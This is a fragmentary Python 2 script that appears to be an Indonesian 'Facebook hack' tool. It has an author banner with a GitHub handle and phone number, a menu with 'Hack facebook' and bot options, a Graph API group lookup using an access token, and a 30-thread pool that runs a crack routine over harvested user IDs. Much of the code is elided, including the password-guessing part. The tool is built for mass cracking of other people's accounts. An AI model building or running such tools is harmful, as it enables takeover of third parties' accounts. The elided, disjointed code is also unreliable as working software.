...
br.addheaders = [('User-Agent','Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36',)]
...
\033[1;91m
  ...
  ██▌     ██▌      ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗
   ...
   █████████     «----------☆----------»\033[1;91m
             \033[1;92m                 \033[1;91m
              \033[1;97m
                 [+]Author : 4Njasm4Ra[+]\033[1;91m
       ==============================================            
        ~[+]Github : Https://github.com/Anjas345[+]\033[1;97m~  \033[1;97m
       =============================================
           [~]Kontak Admin : 085710024311[~]
 \033[1;97m  """
...
def tik():
    ...
    for i in range(100):
        time.sleep(0.1)
        sys.stdout.write('\r[!]Waitt gan \x1b[1;97m' + animation[(i % len(animation))])
        sys.stdout.flush()
...
def menu():
    ...
    os.system('clear')
    print logo
    print '║1.Get information Friend'
    print '║2.Hack facebook'
    print '║3.bot facebook'
    print '║4.Others'
    print '║5.Update'
    print '║6.Logout My tools'
    print '║0.Exit'
    print '║'
    pilih()
...
def menu_hack():
    ...
    os.system('clear')
    print logo
    print 52 * '\033[1;92m\xe2\x95\x90'
...
def pilih_super():
    ...
    if peak == '':
        ...
        if peak == '1':
            ...
            if peak == '2':
                ...
                print logo
                print 52 * '\x1b[1;97m\xe2\x95\x90'
                idg = raw_input('[?]ID Group : ')
                try:
                    r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)
                    asw = json.loads(r.text)
                    print '[+]Name grup : ' + asw['name']
                except KeyError:
    ...
    for i in range(100):
        time.sleep(0.01)
        sys.stdout.write('\r[!]Wait to for Crack....' + animation[(i % len(animation))])
        sys.stdout.flush()
    ...
    p = ThreadPool(30)
    p.map(main, id)
    print '\n\x1b[1;91m[+] \x1b[1;97mTq udah mencoba('
